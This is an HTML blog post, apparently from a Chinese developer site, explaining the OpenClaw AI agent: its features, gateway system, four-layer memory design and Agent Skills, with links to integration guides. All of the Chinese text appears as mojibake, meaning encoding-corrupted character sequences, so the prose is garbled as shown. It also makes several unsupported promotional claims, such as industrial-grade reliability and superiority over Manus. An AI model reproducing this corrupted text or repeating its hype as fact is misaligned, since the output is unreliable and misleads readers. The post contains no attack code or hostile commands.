<p>ç›®å‰ï¼Œç½‘ç»œä¸Šå·²æ¶Œç°å¤§é‡ OpenClaw çš„éƒ¨ç½²æ•™ç¨‹ï¼Œæœ¬æ–‡ä¸å†é‡å¤èµ˜è¿°ï¼ˆæ–‡æœ«å°†é™„ä¸Šç¬”è€…æ¨èçš„æœ¬åœ°éƒ¨ç½²æ•™ç¨‹é“¾æ¥ï¼‰ã€‚æœ¬ç¯‡å†…å®¹ç¬”è€…é‡ç‚¹åœ¨äºè§£æÂ <strong>OpenClaw çš„æ ¸å¿ƒç‰¹æ€§ä¸è®¾è®¡æ€è·¯</strong>ï¼Œé€šè¿‡é€šä¿—æ˜“æ‡‚çš„åŸç†è§£è¯»ï¼Œå¸®åŠ©å¤§å®¶åœ¨ä½“éªŒå…¶å¼ºå¤§åŠŸèƒ½çš„åŒæ—¶ï¼Œæ·±å…¥ç†è§£å…¶å·¥ä½œæœºåˆ¶ï¼ŒçœŸæ­£åšåˆ°<strong>çŸ¥å…¶ç„¶ï¼Œäº¦çŸ¥å…¶æ‰€ä»¥ç„¶</strong>ã€‚</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd3eeb24d7ee453dacf3a0b0d533f0e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770778510&amp;x-signature=4qiB4UFED8ofvoeVzayjyiSggEM%3D" alt="0.png" width="70%" loading="lazy"/></p>
<h2 data-id="heading-1">ä¸€ã€OpenClawç‰¹æ€§è¯¦è§£</h2>
<h3 data-id="heading-2">1.1 OpenClawèƒ½åŠ›æ¦‚è§ˆ</h3>
<p>ä½œä¸º 2026 å¹´ä»¥æ¥æœ€å—å…³æ³¨çš„å¼€æºé¡¹ç›®ï¼ŒOpenClaw çš„èƒ½åŠ›è¦†ç›–èŒƒå›´æå¹¿ï¼Œå‡ ä¹å¯ä»¥è§†ä½œä¸€ä½å…¨èƒ½çš„â€œæ•°å­—å‘˜å·¥â€ã€‚å…¶ä¸»è¦åº”ç”¨åœºæ™¯åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>è‡ªåŠ¨åŒ–ä¸å¼€å‘</strong>ï¼šæµè§ˆå™¨è‡ªåŠ¨åŒ–ã€AI è‡ªåŠ¨ç¼–ç¨‹ã€æ•°æ®å¤„ç†ä¸æŠ¥å‘Šç”Ÿæˆã€‚</li>
<li><strong>æ—¥å¸¸åŠå…¬è¾…åŠ©</strong>ï¼šè‡ªåŠ¨å›å¤é‚®ä»¶ã€å…¨ç½‘å•†å“æ¯”ä»·ã€æ•´ç†å¤‡å¿˜å½•ã€ä¼šè®®å½•éŸ³è½¬æ–‡å­—çºªè¦ç­‰ã€‚</li>
<li><strong>æ™ºèƒ½è®¾å¤‡è”åŠ¨</strong>ï¼šæ¥å…¥æ™ºèƒ½å®¶å±…ï¼Œè‡ªåŠ¨è°ƒèŠ‚ç¯å…‰ã€æ¸©åº¦ç­‰ç¯å¢ƒå‚æ•°ã€‚</li>
<li><strong>è·¨ç»ˆç«¯è¿œç¨‹åä½œ</strong>ï¼šé€šè¿‡ä¸ iMessage ç­‰å³æ—¶é€šè®¯å·¥å…·å¯¹æ¥ï¼Œç”¨æˆ·å¯ç›´æ¥åœ¨æ‰‹æœºç«¯å‘ OpenClaw ä¸‹è¾¾æŒ‡ä»¤ï¼Œè¿œç¨‹å®‰æ’å·¥ä½œã€‚æ›´æœ‰å¼€å‘è€…å®ç°äº†é€šè¿‡ Apple Watch è¿œç¨‹æŒ‡æŒ¥ OpenClaw åˆå¹¶ PRã€è‡ªåŠ¨ Debug ç­‰æ“ä½œã€‚</li>
</ul>
<p>æ€»çš„æ¥è¯´å‡¡æ˜¯èƒ½å¤Ÿé€šè¿‡Â <strong>Skillsï¼ˆæŠ€èƒ½æ¨¡å—ï¼‰</strong> Â æˆ–Â <strong>MCPï¼ˆModel Context Protocolï¼Œæ¨¡å‹ä¸Šä¸‹æ–‡åè®®ï¼‰</strong> Â å°è£…å®ç°çš„åŠŸèƒ½ï¼ŒOpenClaw çš†èƒ½æ— ç¼è¡”æ¥ã€‚</p>
<p>æ³¨ï¼šå¦‚å¯¹ Agent Skills æˆ– MCP ä¸ç†Ÿæ‚‰ï¼Œå¯å‚é˜…ç¬”è€…å¾€æœŸæ–‡ç« ï¼š</p>
<ul>
<li>ã€Š<a href="https://juejin.cn/post/7598918127578972194" target="_blank" title="https://juejin.cn/post/7598918127578972194">Agent Skills å®Œå…¨æŒ‡å—ï¼šæ ¸å¿ƒæ¦‚å¿µä¸¨è®¾è®¡æ¨¡å¼ä¸¨å®æˆ˜ä»£ç </a>ã€‹</li>
<li>ã€Š<a href="https://juejin.cn/post/7488895565314949120" target="_blank" title="https://juejin.cn/post/7488895565314949120">ç†è®º+ä»£ç ä¸€æ–‡å¸¦ä½ æ·±å…¥æµ…å‡º MCPï¼šäººå·¥æ™ºèƒ½å¤§æ¨¡å‹ä¸å¤–éƒ¨ä¸–ç•Œäº¤äº’çš„é©å‘½æ€§çªç ´</a>ã€‹</li>
</ul>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b858711bb244d0b8f00948fdc92d520~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770778510&amp;x-signature=JrV4cIExlXTwTZPL92ESW%2F0kxfI%3D" alt="2.png" loading="lazy"/></p>
<h3 data-id="heading-3">1.2 OpenClaw æ ¸å¿ƒç‰¹æ€§</h3>
<p>é™¤äº†å¹¿æ³›çš„èƒ½åŠ›è¦†ç›–ï¼ŒOpenClaw åœ¨è®¾è®¡ä¸Šè¿˜å…·æœ‰ä»¥ä¸‹ä¸‰å¤§æ ¸å¿ƒä¼˜åŠ¿ï¼š</p>
<p><strong>1. å…¨å¹³å°æ¥å…¥ä¸å®æ—¶äº¤äº’</strong><br/>
OpenClaw å¯è½»æ¾æ¥å…¥å„ç±»èŠå¤©å·¥å…·ï¼ˆå¦‚ Telegramã€å¾®ä¿¡ã€iMessage ç­‰ï¼‰ä¸æ™ºèƒ½è®¾å¤‡ã€‚ç”¨æˆ·å³ä½¿ä¸åœ¨ç”µè„‘å‰ï¼Œä¹Ÿèƒ½é€šè¿‡æ‰‹æœºè¿œç¨‹æŒ‡æ´¾ä»»åŠ¡ã€‚OpenClaw ä¸ä»…èƒ½æ‰§è¡Œæ“ä½œï¼Œè¿˜èƒ½å®æ—¶å›ä¼ å±å¹•æˆªå›¾ã€æ‰§è¡Œæ—¥å¿—ç­‰ä¿¡æ¯ï¼Œè®©æ•´ä¸ªè¿‡ç¨‹å®Œå…¨é€æ˜ã€‚æ­¤å¤–ï¼Œé€šè¿‡å¯¹æ¥éº¦å…‹é£ã€æ‘„åƒå¤´ç­‰å¤–è®¾ï¼Œå®ƒè¿˜èƒ½ç›´æ¥å¤„ç†éŸ³è§†é¢‘ä¿¡æ¯ï¼Œå®ç°æ›´è‡ªç„¶çš„äº¤äº’ã€‚</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b611d17e8edf471b921409285adcb516~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770778510&amp;x-signature=0op8yMs%2Bngwo7Ne%2FLc9jIVyjLPw%3D" alt="3.png" width="50%" loading="lazy"/></p>
<p><strong>2. æ™ºèƒ½å®šæ—¶ä»»åŠ¡ä¸ä¸»åŠ¨åˆ¤æ–­</strong><br/>
OpenClawå†…ç½®å¼ºå¤§çš„è‡ªç„¶è¯­è¨€å®šæ—¶ä»»åŠ¡å¼•æ“ã€‚ç”¨æˆ·åªéœ€ç”¨æ—¥å¸¸è¯­è¨€æè¿°ï¼Œå³å¯åˆ›å»ºä¸´æ—¶æé†’ã€å®šæœŸæ£€æŸ¥æ”¶ä»¶ç®±ç­‰ä»»åŠ¡ã€‚æ›´é‡è¦çš„æ˜¯ï¼ŒOpenClaw å…·å¤‡äº‹ä»¶ç´§æ€¥ç¨‹åº¦åˆ¤æ–­èƒ½åŠ›ï¼Œå¯è‡ªä¸»å†³å®šæ˜¯å¦é€šè¿‡èŠå¤©å·¥å…·ä¸»åŠ¨è”ç³»ç”¨æˆ·ã€‚è¿™ä¸€åšæ³•æ‰“ç ´äº†ä¼ ç»Ÿâ€œæŒ‡ä»¤-æ‰§è¡Œâ€çš„è¢«åŠ¨å¾ªç¯ï¼Œè®©æ™ºèƒ½ä½“å……åˆ†å‘æŒ¥å®ƒçš„ä¸»è§‚èƒ½åŠ¨æ€§ã€‚</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a506b7b3461b400d87619fd2972d7ef2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770778510&amp;x-signature=A%2BGOqfYRcgDQBZiQHZF8UiZEmJs%3D" alt="4.png" width="50%" loading="lazy"/></p>
<p><strong>3. æŒç»­è¿›åŒ–çš„é•¿æœŸè®°å¿†</strong><br/>
OpenClaw æ”¯æŒå°†è®°å¿†ä»¥æ–‡ä»¶å½¢å¼å­˜å‚¨åœ¨æœ¬åœ°ï¼Œå¹¶èƒ½åœ¨å¯¹è¯ä¸­å¿«é€Ÿæ£€ç´¢ç›¸å…³è®°å¿†å¹¶æ”¾å…¥ä¸Šä¸‹æ–‡ã€‚éšç€ä½¿ç”¨é¢‘æ¬¡å¢åŠ ï¼Œå®ƒä¼šä¸»åŠ¨æ›´æ–°å’Œä¼˜åŒ–è¿™äº›è®°å¿†æ–‡ä»¶ï¼Œå®ç°â€œè¶Šç”¨è¶Šèªæ˜â€çš„æŒç»­å­¦ä¹ æ•ˆæœã€‚</p>
<p>ç»è¿‡å…¨ç½‘å¤§é‡çš„å®è·µè¯æ˜ï¼ŒOpenClawä¸ä»…æ˜¯ä¸€ä¸ªåŠŸèƒ½å®Œå–„ã€æ€§èƒ½å‰æ²¿çš„å…¨æ–°ä¸€ä»£æ™ºèƒ½ä½“ï¼Œè€Œä¸”è¿è¡Œç¨³å®šï¼Œå„é¡¹å‚æ•°ç”Ÿæˆå®Œæ•´ï¼Œæ˜¯ä¸€é¡¹å®Œå…¨èƒ½å¤Ÿåº”ç”¨äºå·¥ä¸šçº§åœºæ™¯çš„é«˜æ€§èƒ½æ™ºèƒ½ä½“ã€‚æˆ–è®¸OpenClawçš„å‡ºç°æ˜¯æˆ‘ä»¬äººç±»ç¬¬ä¸€æ¬¡çœŸæ­£æ„ä¹‰ä¸Šæ‹¥æœ‰äº†æœŸå¾…å·²ä¹…çš„æ•°å­—å‘˜å·¥ï¼</p>
<h2 data-id="heading-4">äºŒã€OpenClaw åŸç†è§£æ</h2>
<p>OpenClaw ç”±å‰ PSPDFKit åˆ›å§‹äºº Peter Steinberger å¼€å‘ï¼Œä¸€ä½è‡ªç§°ä¸ºâ€œé€€ä¼‘ç¨‹åºå‘˜â€ï¼Œå´æ‰“é€ å‡ºäº†ä¸€æ¬¾é¢‡å…·é©å‘½æ€§çš„å¼€æºä¸ªäººAIåŠ©æ‰‹çš„å¤§ç¥! è¯¥é¡¹ç›®æœ€åˆçš„ç†å¿µæ˜¯ â€œClaude with handsâ€ï¼ˆæ‹¥æœ‰åŒæ‰‹çš„ Claudeï¼‰ï¼Œæ—¨åœ¨å°†å¤§å‹è¯­è¨€æ¨¡å‹çš„æ™ºèƒ½ä¸æœ¬åœ°ç³»ç»Ÿçš„æ“ä½œèƒ½åŠ›æ·±åº¦èåˆã€‚</p>
<p>åˆæ¬¡æ¥è§¦ OpenClawï¼Œå¤§å®¶æˆ–è®¸ä¼šè”æƒ³åˆ°æ­¤å‰å¤§ç«çš„Â <a href="https://juejin.cn/post/7479212482546073611" target="_blank" title="https://juejin.cn/post/7479212482546073611">Manus</a>Â ç­‰é¡¹ç›®ã€‚ä½† OpenClaw å¹¶éä¸€ä¸ªè¿è¡Œåœ¨æµè§ˆå™¨ä¸­çš„ç½‘é¡µåº”ç”¨ï¼Œè€Œæ˜¯ä¸€ä¸ªéƒ¨ç½²äºæœ¬åœ°çš„åå°æœåŠ¡ã€‚è¿™æ„å‘³ç€å®ƒæ‹¥æœ‰æé«˜çš„éšç§å®‰å…¨æ€§å’Œå¯¹ä½ ç”µè„‘çš„ç›´æ¥æ“ä½œæƒé™ã€‚å¤§å®¶å¯ä»¥å°†å…¶ç†è§£ä¸ºä¸€ä¸ªæˆç†Ÿçš„â€œComputer Useâ€ï¼Œèƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤è¡ŒæŒ‡ä»¤ã€åœ¨æ²™ç›’ç¯å¢ƒä¸­è¿è¡Œä»£ç ï¼Œå¹¶æ“æ§æµè§ˆå™¨ç­‰åº”ç”¨ã€‚</p>
<p>OpenClaw ä¸ Manus ç­‰é¡¹ç›®çš„æœ¬è´¨åŒºåˆ«ï¼Œåœ¨äºå…¶ä»¥ä¸‹å‡ é¡¹æ ¸å¿ƒæ¶æ„çš„å·§å¦™è®¾è®¡ï¼š</p>
<h3 data-id="heading-5">2.1 ç½‘å…³ç³»ç»Ÿï¼šåè®®æ— å…³çš„æ™ºèƒ½ç¼–æ’å±‚</h3>
<p>OpenClaw æ‹¥æœ‰ä¸€ä¸ªå¼ºå¤§ä¸”çµæ´»çš„<strong>ç½‘å…³ç³»ç»Ÿï¼ˆGateway Systemï¼‰</strong> ã€‚å®ƒä¸ä»…ä»…æ˜¯ä¸€ä¸ªç®€å•çš„ API è½¬å‘å™¨ï¼Œæ›´æ˜¯ä¸€ä¸ª<strong>åè®®æ— å…³çš„ç¼–æ’å±‚ï¼ˆProtocol-Agnostic Orchestratorï¼‰</strong> ã€‚å…¶æ ¸å¿ƒåœ¨äºç»´æŠ¤ä¸€ä¸ªæŒä¹…çš„ WebSocket è¿æ¥ï¼Œæ„å»ºå‡ºä¸€æ¡å®æ—¶ã€åŒå‘çš„é€šä¿¡é€šé“ã€‚æ— è®ºæŒ‡ä»¤æ¥è‡ªç»ˆç«¯å‘½ä»¤è¡Œã€Web æ§åˆ¶é¢æ¿ï¼Œè¿˜æ˜¯é€šè¿‡ iMessage ç­‰é€šè®¯å·¥å…·è¿œç¨‹å‘é€ï¼Œç½‘å…³éƒ½èƒ½å°†è¿™äº›å¼‚æ„çš„è¾“å…¥ä¿¡å·å³æ—¶æ ‡å‡†åŒ–ï¼Œå¹¶ç»Ÿä¸€ç»´æŠ¤<strong>ä¼šè¯çŠ¶æ€ï¼ˆSession Stateï¼‰</strong> ã€‚</p>
<p>è¿™ä¹Ÿè§£é‡Šäº†ä¸ºä½•è®¸å¤šç”¨æˆ·é€‰æ‹©ä½¿ç”¨ Mac Mini ä½œä¸º OpenClaw çš„æœåŠ¡å™¨ï¼šä¸€æ–¹é¢æ˜¯ä¸ºäº†æ‹¥æœ‰ä¸€ä¸ª 7x24 å°æ—¶å¾…å‘½çš„ä¸“å± AI åŠ©æ‰‹ï¼›å¦ä¸€æ–¹é¢ï¼Œåœ¨è‹¹æœç”Ÿæ€ä¸‹ï¼Œç”¨æˆ·å¯ä»¥ç›´æ¥é€šè¿‡ iPhone æˆ– Apple Watch ä¸Šçš„ iMessage ä¸è¿œç¨‹ OpenClaw å¯¹è¯ï¼Œæ— éœ€å®‰è£…ä»»ä½•é¢å¤–æ’ä»¶ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6743cd220f1348cbbe761fbd5a68ae79~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770778510&amp;x-signature=3rOc5Tj7KDK3mhi8Lh6zinrM8S4%3D" alt="6.png" loading="lazy"/></p>
<h3 data-id="heading-6">2.2 å››å±‚è®°å¿†æ¶æ„ï¼šå®ç°æ— é™é•¿ä¸Šä¸‹æ–‡ä¸æŒç»­è¿›åŒ–</h3>
<p>OpenClaw çš„å¦ä¸€å¤§æ ¸å¿ƒä¼˜åŠ¿åœ¨äºå…¶ç²¾å·§çš„ä¸Šä¸‹æ–‡ç®¡ç†å·¥ç¨‹ã€‚å®ƒé€šè¿‡Â <strong>SOULã€TOOLSã€USERã€Session</strong>Â å››å±‚è®°å¿†ç»“æ„ï¼Œæ„å»ºäº†ä¸€å¥—é«˜æ€§èƒ½çš„ä¸Šä¸‹æ–‡ç®¡ç†ç³»ç»Ÿã€‚</p>
<ol>
<li><strong>SOULï¼ˆçµé­‚ï¼‰</strong> ï¼šæ™ºèƒ½ä½“çš„ä¸å¯å˜å†…æ ¸ï¼ŒåŒ…å«äº†å…¶åº•å±‚çš„ç³»ç»ŸæŒ‡ä»¤ä¸æ ¸å¿ƒè¡Œä¸ºå‡†åˆ™ã€‚</li>
<li><strong>TOOLSï¼ˆå·¥å…·ï¼‰</strong> ï¼šåŠ¨æ€çš„å·¥å…·æ³¨å†Œè¡¨ã€‚ç³»ç»Ÿå¯æ ¹æ®å½“å‰ç¯å¢ƒï¼Œçµæ´»æ³¨å…¥å¯ç”¨çš„ API å’Œèƒ½åŠ›ï¼Œå®ç°æŒ‰éœ€è°ƒç”¨ã€‚</li>
<li><strong>USERï¼ˆç”¨æˆ·è®°å¿†ï¼‰</strong> ï¼šåŸºäºè¯­ä¹‰å‘é‡çš„é•¿æœŸè®°å¿†åº“ã€‚OpenClaw ä¼šåœ¨äº¤äº’ä¸­è‡ªåŠ¨å­¦ä¹ å¹¶å­˜å‚¨ç”¨æˆ·çš„åå¥½ã€ä¹ æƒ¯ç”šè‡³ä»£ç é£æ ¼ï¼Œä»è€Œå®ç°â€œè¶Šç”¨è¶Šæ‡‚ä½ â€çš„ä¸ªæ€§åŒ–ä½“éªŒã€‚</li>
<li><strong>Sessionï¼ˆä¼šè¯è®°å¿†ï¼‰</strong> ï¼šå®æ—¶çš„æƒ…æ™¯è®°å¿†ã€‚å®ƒèƒ½æ•æ‰å½“å‰å¯¹è¯ä¸­æœ‰ä»·å€¼çš„ä¿¡æ¯ï¼Œå¹¶åŠ¨æ€åœ°å°†å…¶çº³å…¥ä¸Šä¸‹æ–‡ï¼Œä¿è¯å¯¹è¯çš„è¿è´¯æ€§ã€‚</li>
</ol>
<p>è¿™å¥—åˆ†å±‚è®°å¿†ä½“ç³»ä¸ä»…æ”¯æ’‘äº†â€œæ— é™é•¿ä¸Šä¸‹æ–‡â€çš„å¯¹è¯ä½“éªŒï¼Œæ›´æ˜¯ OpenClaw èƒ½å¤ŸæŒç»­å­¦ä¹ ã€ä¸æ–­è¿›åŒ–çš„æŠ€æœ¯åŸºçŸ³ã€‚è¿™ä¸€æ•´å¥—çš„ä¸Šä¸‹æ–‡è®°å¿†ç®¡ç†å·¥ç¨‹å€¼å¾—å¤§å®¶å¼€å‘æ™ºèƒ½ä½“å€Ÿé‰´å­¦ä¹ ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a46634fdc7a49fbbdd74921e4c1f197~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770778510&amp;x-signature=J6fEFfMZh5d6UN0u6g2aGXud6j0%3D" alt="7.png" loading="lazy"/></p>
<h3 data-id="heading-7">2.3 Agent Skills åŠŸèƒ½ä½“ç³»ï¼šå³æ’å³ç”¨çš„èƒ½åŠ›æ‰©å±•</h3>
<p>å¦‚æœè¯´ MCP åè®®æ˜¯ä¸ºäº†è®©æ™ºèƒ½ä½“æ›´é«˜æ•ˆåœ°â€œè°ƒç”¨å·¥å…·â€ï¼Œé‚£ä¹ˆÂ <strong>Agent Skills</strong>Â åˆ™æ˜¯ç›´æ¥ä¸ºæ™ºèƒ½ä½“â€œèµ‹äºˆèƒ½åŠ›â€ã€‚</p>
<p>ä¾‹å¦‚ï¼Œå®‰è£…Â <code>apple-notes</code>Â Skill åï¼ŒOpenClaw ä¾¿å³åˆ»è·å¾—è¯»å†™å’Œæ“ä½œè‹¹æœä¾¿ç­¾çš„å…¨éƒ¨æƒé™ï¼›åŠ è½½Â <code>bird</code>Â Skillï¼Œå®ƒå°±èƒ½è‡ªåŠ¨å¸®ä½ æœé›†ã€æ•´ç†æ¨ç‰¹ä¿¡æ¯ï¼Œç”šè‡³ä»£ä¸ºå‘å¸ƒæ¨æ–‡ã€‚ç®€è€Œè¨€ä¹‹ï¼Œ<strong>æƒ³è®© OpenClaw å…·å¤‡ä»€ä¹ˆèƒ½åŠ›ï¼Œåªéœ€å®‰è£…å¯¹åº”çš„ Skill å³å¯</strong>ã€‚</p>
<p>æ­¤å¤–ï¼ŒOpenClaw è¿˜æ”¯æŒå®Œæ•´çš„<strong>å¤šæ¨¡æ€æ¨¡å‹è°ƒç”¨</strong>ï¼Œå¹¶é›†æˆäº†è¯¸å¦‚çœ‹é—¨ç‹—ï¼ˆç›‘æ§ï¼‰å­ç³»ç»Ÿã€æ’ä»¶ä½“ç³»ã€è·¨å¹³å°éƒ¨ç½²ç­‰å¤šé¡¹ä¼ä¸šçº§ç‰¹æ€§ã€‚ç”±æ­¤å¯è§ï¼Œè¿™ç»éä¸€ä¸ªç®€å•çš„â€œä¸ªäººç©å…·â€ï¼Œè€Œæ˜¯åœ¨ Agent Skills ä¸ Vibe Coding æ—¶ä»£èƒŒæ™¯ä¸‹ï¼Œè¶…è¶Š Manus çš„ã€é¢å‘æœªæ¥çš„æ–°ä¸€ä»£é€šç”¨æ™ºèƒ½ä½“å¹³å°ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8864ac619cc0453ba5b9c789e933c0bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770778510&amp;x-signature=00uX14ToOWk47vqyWOrGm4tdiK8%3D" alt="8.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ac4100b4e6548a1b8909017b35d9129~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770778510&amp;x-signature=12XJz7e7%2Fe86R3IozLf797R%2BuZI%3D" alt="9.png" loading="lazy"/></p>
<h2 data-id="heading-8">ä¸‰ã€OpenClaw å®ç”¨æŒ‡å—ï¼šæ¥å…¥å›½å†…å¤§æ¨¡å‹ä¸ä¸»æµèŠå¤©å·¥å…·</h2>
<p>æ— è®ºæ˜¯å¸Œæœ›æ‹¥æœ‰ä¸€ä¸ªä¸“å±çš„â€œè´¾ç»´æ–¯â€æ¥æå‡å·¥ä½œæ•ˆç‡ï¼Œè¿˜æ˜¯ä½œä¸ºå¼€å‘è€…å¸Œæœ›å­¦ä¹ æœ€å‰æ²¿çš„ Agent è®¾è®¡ç†å¿µï¼ŒOpenClaw éƒ½æ˜¯ä¸€ä¸ªæå…·ä»·å€¼çš„é«˜è´¨é‡é¡¹ç›®ï¼Œéå¸¸å€¼å¾—åœ¨æœ¬åœ°è¿›è¡Œæ·±å…¥å°è¯•å’Œå®è·µã€‚</p>
<p>ä¸ºäº†å¸®åŠ©å¤§å®¶å¿«é€Ÿå®ç°ä¸€ä¸ªâ€œèƒ½å¹²äº‹ã€ä¼šæ²Ÿé€šâ€çš„ä¸ªäººæ™ºèƒ½ä½“ï¼Œä»¥ä¸‹æ˜¯ç¬”è€…æ•´ç†çš„Â <strong>OpenClaw æ¥å…¥å›½å†…ä¸»æµèŠå¤©å·¥å…·ä¸å›½äº§å¤§æ¨¡å‹çš„å®ç”¨æŒ‡å—æ±‡æ€»</strong>ã€‚</p>
<h3 data-id="heading-9">3.1 ä¸»æµèŠå¤©å·¥å…·æ¥å…¥</h3>
<p>OpenClaw å¼ºå¤§çš„ç½‘å…³ç³»ç»Ÿä½¿å…¶èƒ½è½»æ¾é€‚é…å„ç±»å³æ—¶é€šè®¯å·¥å…·ã€‚ä»¥ä¸‹æ˜¯å‡ ä¸ªä¸»æµå¹³å°çš„æ¥å…¥æ•™ç¨‹ï¼š</p>
<ul>
<li>
<p><strong>æ¥å…¥ WhatsApp æŒ‡å—</strong><br/>
è§†é¢‘æ•™ç¨‹ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1kH6nBFEPq" target="_blank" title="https://www.bilibili.com/video/BV1kH6nBFEPq" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1kHâ€¦</a></p>
</li>
<li>
<p><strong>æ¥å…¥é£ä¹¦æŒ‡å—</strong><br/>
è§†é¢‘æ•™ç¨‹ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1kH6nBFEPq" target="_blank" title="https://www.bilibili.com/video/BV1kH6nBFEPq" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1kHâ€¦</a></p>
</li>
<li>
<p><strong>æ¥å…¥å¾®ä¿¡ã€é’‰é’‰ã€QQ ä¸€ç«™å¼æŒ‡å—</strong><br/>
è§†é¢‘æ•™ç¨‹ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1MfFAz6EnR" target="_blank" title="https://www.bilibili.com/video/BV1MfFAz6EnR" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1Mfâ€¦</a></p>
</li>
</ul>
<h3 data-id="heading-10">3.2 å›½äº§å¤§æ¨¡å‹é›†æˆæ–¹æ¡ˆ</h3>
<p>é™¤äº†é»˜è®¤çš„ Claude/OpenAI æ¨¡å‹ï¼ŒOpenClaw æ¶æ„ä¹Ÿæ”¯æŒçµæ´»å¯¹æ¥å›½äº§å¤§æ¨¡å‹ï¼ˆå¦‚MinMaxç­‰ï¼‰ã€‚é€šå¸¸åªéœ€åœ¨é…ç½®ä¸­æ›¿æ¢å¯¹åº”çš„ API ç«¯ç‚¹ä¸å¯†é’¥ï¼Œå³å¯äº«å—å›½äº§æ¨¡å‹æœåŠ¡ï¼Œåœ¨æ•°æ®éšç§ä¸ç½‘ç»œå»¶è¿Ÿä¸Šæ›´å…·ä¼˜åŠ¿ã€‚</p>
<h3 data-id="heading-11">3.3 äº‘å¹³å°ä¸€ç«™å¼éƒ¨ç½²</h3>
<p>ç›®å‰ï¼Œ<strong>é˜¿é‡Œäº‘ã€ç«å±±å¼•æ“</strong>ç­‰ä¸»æµäº‘å¹³å°å·²æä¾›é¢„é›†æˆçš„ OpenClaw éƒ¨ç½²æ–¹æ¡ˆã€‚åœ¨å¯¹åº”çš„äº‘å¸‚åœºæˆ–AIå¹³å°æœåŠ¡ä¸­æœç´¢ â€œOpenClawâ€ï¼Œå³å¯æ‰¾åˆ°å®˜æ–¹æˆ–ç¤¾åŒºç»´æŠ¤çš„é•œåƒä¸éƒ¨ç½²æ¨¡æ¿ï¼Œå®ç°åˆ†é’Ÿçº§äº‘ç«¯ä¸Šçº¿ï¼Œéå¸¸é€‚åˆä¸æƒ³æŠ˜è…¾æœ¬åœ°ç¯å¢ƒçš„ç”¨æˆ·ã€‚</p>
<p><strong>å°è¯•éƒ¨ç½²å±äºå¤§å®¶çš„ OpenClawï¼Œå¼€å¯é«˜æ•ˆæ™ºèƒ½çš„â€œæ•°å­—å‘˜å·¥â€æ—¶ä»£å§ï¼</strong></p>
<h2 data-id="heading-12">å››ã€æ€»ç»“</h2>
<p>æœ¬æ–‡åˆ†äº«äº†OpenClawæ ¸å¿ƒç‰¹æ€§ä¸è®¾è®¡åŸç†ï¼Œå¹¶æä¾›äº†æ¥å…¥å›½äº§å¤§æ¨¡å‹ä¸ä¸»æµèŠå¤©å·¥å…·çš„å®ç”¨æŒ‡å—ã€‚OpenClawæ˜¯2026å¹´ç°è±¡çº§å¼€æºæ™ºèƒ½ä½“ï¼Œå®ƒé€šè¿‡ç‹¬ç‰¹çš„ç½‘å…³ç³»ç»Ÿå®ç°å…¨å¹³å°å®æ—¶äº¤äº’ï¼Œå‡­å€Ÿå››å±‚è®°å¿†æ¶æ„æ‹¥æœ‰é•¿æœŸè®°å¿†ä¸å­¦ä¹ èƒ½åŠ›ï¼Œå¹¶å€Ÿç”±Agent Skillsä½“ç³»çµæ´»æ‰©å±•åŠŸèƒ½æ­£å‘ç€æœªæ¥æ—¶ä»£çš„å…¨èƒ½æ•°å­—å‘˜å·¥è¿ˆè¿›ã€‚</p>
